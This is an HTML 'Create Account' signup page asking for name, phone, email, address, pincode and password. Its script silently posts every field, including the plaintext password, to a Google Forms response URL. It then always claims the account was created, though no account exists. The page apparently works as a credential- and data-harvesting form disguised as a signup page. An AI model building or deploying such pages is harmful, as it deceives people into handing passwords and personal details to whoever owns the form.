<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Signup Form</title>
  <style>
    body {
      font-family: "Segoe UI", Arial, sans-serif;
      background: linear-gradient(135deg, #a8edea, #fed6e3);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 10px;
    }
    .signup-box {
      background: #ffffff;
      padding: 40px 30px;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
      animation: fadeIn 0.8s ease-in-out;
      box-sizing: border-box;
      text-align: center;
    }
    h2 { color: #5a4fcf; margin-bottom: 20px; font-weight: 600; }
    label { display: block; margin-bottom: 6px; font-size: 14px; color: #444; text-align: left; }
    input { width: 100%; padding: 10px; margin-bottom: 16px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; box-sizing: border-box; }
    input:focus { border-color: #5a4fcf; outline: none; }
    button { width: 100%; padding: 12px; background: #5a4fcf; color: #fff; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; }
    button:hover { background: #4636b8; }
    @keyframes fadeIn { from {opacity:0;transform:translateY(15px);} to {opacity:1;transform:translateY(0);} }

    /* Responsive tweaks */
    @media (max-width: 500px) {
      .signup-box { padding: 30px 20px; }
      input, button { font-size: 15px; padding: 10px; }
    }
    .thankyou-message {
      text-align: center;
      font-size: 18px;
      color: #5a4fcf;
      margin-top: 10px;
    }
  </style>
</head>
<body>

<div class="signup-box" id="form-container">
  <h2>Create Account</h2>
  <form id="signup-form">
    <label>Full Name</label>
    <input type="text" name="entry.1573966539" required>

    <label>Phone Number</label>
    <input type="text" name="entry.555635589" required>

    <label>Email</label>
    <input type="email" name="entry.591353669" required>

    <label>Address</label>
    <input type="text" name="entry.894076504" required>

    <label>Pincode</label>
    <input type="text" name="entry.183602187" required>

    <label>Password</label>
    <input type="password" name="entry.1252695323" required>

    <button type="submit">Sign Up</button>
  </form>
</div>

<script>
const form = document.getElementById('signup-form');
form.addEventListener('submit', function(e) {
  e.preventDefault();

  const formData = new FormData(form);
  const params = new URLSearchParams(formData);

  fetch('https://docs.google.com/forms/d/e/1FAIpQLSevg7YKmJAia5fmI4ED3vTkH6lAUvmPmxlNodoJs0gQK1smeQ/formResponse', {
    method: 'POST',
    body: params
  }).finally(() => {
    document.getElementById('form-container').innerHTML = `
      <h2>ðŸŽ‰ Thank You!</h2>
      <p class="thankyou-message">Your account has been created successfully.</p>
    `;
  });
});
</script>

</body>
</html>
